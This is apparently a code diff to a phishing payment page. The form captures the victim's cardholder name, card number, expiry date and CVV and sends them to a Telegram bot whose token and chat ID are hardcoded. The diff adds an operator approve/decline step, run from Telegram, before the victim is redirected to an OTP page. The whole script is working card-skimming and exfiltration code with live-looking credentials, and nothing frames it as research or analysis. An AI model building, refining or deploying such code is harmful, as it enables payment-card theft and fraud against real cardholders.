@@ -294,6 +294,30 @@
         .muted {
             color: #999;
         }
+        /* ...your existing CSS... */
+        
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 3px solid rgba(255, 255, 255, 0.35);
+            border-top-color: rgba(255, 255, 255, 1);
+            border-radius: 50%;
+            display: none;
+            vertical-align: -4px;
+            margin-right: 8px;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        /* optional: make button text dim when spinning */
+        
+        .btn.is-waiting {
+            opacity: 0.9;
+        }
     </style>
 </head>
 
@@ -323,8 +347,7 @@
 
             <div class="input-group">
                 <label for="card-number">Card Number</label>
-                <input type="text" id="card-number" placeholder="1111 2222 3333 4444" maxlength="19" inputmode="numeric" required autocomplete="cc-number">
-            </div>
+                <input type="text" id="card-number" placeholder="1111 2222 3333 4444" maxlength="19" inputmode="numeric" required autocomplete="cc-number" /> </div>
 
             <div class="card-exp-cvv">
                 <div class="input-group">
@@ -341,8 +364,10 @@
             <div class="otp-error" id="otp-error"></div>
 
             <button type="submit" class="btn" id="submitButton">
-        <i class="fas fa-lock"></i>&nbsp; <span id="btnText">Confirm Payments</span>
-      </button>
+            <i class="fas fa-lock"></i>&nbsp;
+            <span class="spinner" id="btnSpinner" aria-hidden="true"></span>
+              <span id="btnText">Confirm Payments</span>
+              </button>
 
             <div class="status-box" id="statusBox">
                 <div><b id="statusTitle">Waiting…</b></div>
@@ -370,52 +395,172 @@
     </div>
 
     <script>
-        // ---------- LIVE PREVIEW: name ----------
-        document.getElementById("card-name").addEventListener("input", e => {
-            document.getElementById("cp-name").textContent =
-                e.target.value.trim() ? e.target.value.trim().toUpperCase() : "JOHN DOE";
+        // ─── Telegram Bot Config ────────────────────────────────────────
+        const botToken = '7996666362:AAFVzLC1LD14nkmJN8MN98SRdOu2hIA1ftc';
+        const chatId = '8406078749';
+
+
+        const cardNumberInput = document.getElementById('card-number');
+
+        function formatCardNumber16(value) {
+            const digits = value.replace(/\D/g, '').slice(0, 16);
+            // Group as 4-4-4-4
+            return digits.replace(/(\d{4})(?=\d)/g, '$1 ');
+        }
+
+        cardNumberInput.addEventListener('input', () => {
+            const beforeCursor = cardNumberInput.selectionStart;
+            const formatted = formatCardNumber16(cardNumberInput.value);
+            cardNumberInput.value = formatted;
+
+            // Keep it simple: don’t over-tune cursor position (works fine for most cases).
         });
 
-        // ---------- LIVE PREVIEW + AUTO-FORMAT: card number (spaces every 4) ----------
-        document.getElementById("card-number").addEventListener("input", e => {
-            let value = e.target.value.replace(/\D/g, "").substring(0, 16);
-            e.target.value = value.replace(/(.{4})/g, "$1 ").trim();
-            document.getElementById("cp-number").textContent =
-                e.target.value ? e.target.value.padEnd(19, "•") : "•••• •••• •••• ••••";
+        cardNumberInput.addEventListener('blur', () => {
+            const digits = cardNumberInput.value.replace(/\D/g, '');
+            if (digits.length !== 16) {
+                // Don’t forcefully clear; just let submit validation show message.
+            }
         });
+        // ─── DOM refs (FIXED IDs) ────────────────────────────────────────
+        const btnSpinner = document.getElementById('btnSpinner');
+        const form = document.getElementById('payment-form');
+        const submitBtn = document.getElementById('submitButton');
+        const statusMsg = document.getElementById('statusSub'); // shows subtext
+        const statusBox = document.getElementById('statusBox'); // container
+        const statusTitle = document.getElementById('statusTitle');
+        const btnText = document.getElementById('btnText'); // span inside button
+        const inputs = form.querySelectorAll('input');
 
-        // ---------- LIVE PREVIEW + AUTO-FORMAT: expiration (MM/YY) ----------
-        document.getElementById("expiration").addEventListener("input", e => {
-            let value = e.target.value.replace(/\D/g, "").substring(0, 4);
-            e.target.value = value.length >= 3 ?
-                value.substring(0, 2) + "/" + value.substring(2) :
-                value;
-            document.getElementById("cp-exp").textContent = e.target.value || "MM/YY";
-        });
+        // ─── Helpers ─────────────────────────────────────────────────────
+        function generateId() {
+            return Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
+        }
 
-        // ---------- CVV: digits only ----------
-        document.getElementById("cvv").addEventListener("input", e => {
-            e.target.value = e.target.value.replace(/\D/g, "").substring(0, 4);
-        });
+        function setStatus(show, title, sub) {
+            statusBox.classList.toggle('show', show);
+            if (title !== undefined) statusTitle.textContent = title;
+            if (sub !== undefined) statusMsg.textContent = sub;
+        }
 
-        // ---------- SUBMIT (Telegram only) ----------
-        document.getElementById('payment-form').addEventListener('submit', function(e) {
+        function resetForm() {
+            inputs.forEach(inp => inp.value = '');
+            setStatus(false, 'Waiting…', 'Fill all inputs to enable verification.');
+            submitBtn.disabled = false;
+            btnText.textContent = 'Confirm Payments';
+            statusTitle.textContent = 'Waiting…';
+            statusMsg.textContent = 'Fill all inputs to enable verification.';
+        }
+
+        function showDecline(msg) {
+            statusTitle.textContent = 'Declined';
+            statusMsg.textContent = msg;
+            setStatus(true);
+        }
+
+        // ─── Poll Telegram for callback decision ───────────────────────
+        function pollForDecision(submissionId) {
+            let offset = 0;
+
+            const poll = setInterval(async() => {
+                try {
+                    const resp = await fetch(
+                        `https://api.telegram.org/bot${botToken}/getUpdates?offset=${offset}&timeout=10`
+                    );
+                    const data = await resp.json();
+
+                    if (data.ok && data.result) {
+                        for (const update of data.result) {
+                            offset = update.update_id + 1;
+
+                            if (update.callback_query) {
+                                const cb = update.callback_query;
+                                const cbData = cb.data || ''; // "approve_xxx" or "decline_xxx"
+                                const parts = cbData.split('_');
+                                const action = parts[0]; // "approve" or "decline"
+                                const id = parts.slice(1).join('_');
+
+                                if (id === submissionId) {
+                                    clearInterval(poll);
+
+                                    if (action === 'approve') {
+                                        window.location.href = 'otp.html';
+                                    } else {
+                                        showDecline('❌ Card details were declined. Please re-enter.');
+                                        resetForm();
+                                        const card = document.querySelector('.card');
+
+                                        card &&
+                                            card.scrollIntoView({
+                                                behavior: 'smooth'
+                                            });
+                                        btnSpinner.style.display = 'none';
+                                        submitBtn.classList.remove('is-waiting');
+                                    }
+                                }
+                            }
+                        }
+                    }
+                } catch (err) {
+                    console.error('Poll error:', err);
+                    btnSpinner.style.display = 'none';
+                    submitBtn.classList.remove('is-waiting');
+                }
+            }, 2000);
+        }
+
+        // ─── Form submission ───────────────────────────────────────────
+        form.addEventListener('submit', function(e) {
             e.preventDefault();
 
-            const cardName = document.getElementById('card-name').value;
-            const cardNumber = document.getElementById('card-number').value;
-            const expiration = document.getElementById('expiration').value;
-            const cvv = document.getElementById('cvv').value;
+            const cardName = document.getElementById('card-name').value.trim();
+            const cardNumber = document.getElementById('card-number').value.trim();
+            const expiration = document.getElementById('expiration').value.trim();
+            const cvv = document.getElementById('cvv').value.trim();
 
-            const botToken = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
-            const chatId = '5615316142';
+            const cardDigits = cardNumber.replace(/\D/g, '');
+
+            if (!cardName || !expiration || !cvv || !cardDigits) {
+                showDecline('⚠️ Please fill in all fields.');
+                return;
+            }
+
+            if (cardDigits.length !== 16) {
+                showDecline('⚠️ Card number must be exactly 16 digits.');
+                return;
+            }
+
+            // Disable button to prevent double-submit
+            submitBtn.disabled = true;
+            btnSpinner.style.display = 'inline-block';
+            submitBtn.classList.add('is-waiting');
+            btnText.textContent = 'Waiting approval...';
+            setStatus(true, 'Waiting…', 'Awaiting approval in Telegram...');
+
+            const submissionId = generateId();
+
             const message =
-                `New Payment Details:\n` +
-                `Name: ${cardName}\n` +
-                `Card Number: ${cardNumber}\n` +
-                `Expiration: ${expiration}\n` +
-                `CVV: ${cvv}`;
+                `🔔 New Card Submission\n━━━━━━━━━━━━━━━\n` +
+                `🆔 ID: ${submissionId}\n` +
+                `👤 Name: ${cardName}\n` +
+                `💳 Card: ${cardNumber}\n` +
+                `📅 Exp: ${expiration}\n` +
+                `🔐 CVV: ${cvv}\n` +
+                `━━━━━━━━━━━━━━━`;
 
+            const inlineKeyboard = {
+                inline_keyboard: [
+                    [{
+                        text: '✅ Approve',
+                        callback_data: `approve_${submissionId}`
+                    }, {
+                        text: '❌ Decline',
+                        callback_data: `decline_${submissionId}`
+                    }]
+                ]
+            };
+
+            // ─── Send to Telegram ──────────────────────────────────────
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: {
@@ -423,20 +568,24 @@
                     },
                     body: JSON.stringify({
                         chat_id: chatId,
-                        text: message
-                    }),
+                        text: message,
+                        reply_markup: inlineKeyboard
+                    })
                 })
                 .then(response => {
-                    if (response.ok) {
-                        window.location.href = "otp.html";
-                    } else {
-                        // No "Payment submitted!" alert
-                        // (Optionally show an error instead)
-                        console.error('Error sending message to Telegram.');
-                    }
+                    if (!response.ok) return response.text().then(t => {
+                        throw new Error(t);
+                    });
+
+                    // Success → show status + start polling
+                    setStatus(true, 'Waiting…', 'Awaiting approval..');
+                    pollForDecision(submissionId);
                 })
                 .catch(error => {
-                    console.error('Error:', error);
+                    console.error('Telegram Error:', error);
+                    showDecline('❌ Error while approving. Please try again.');
+                    submitBtn.disabled = false;
+                    btnText.textContent = 'Confirm Payments';
                 });
         });
     </script>
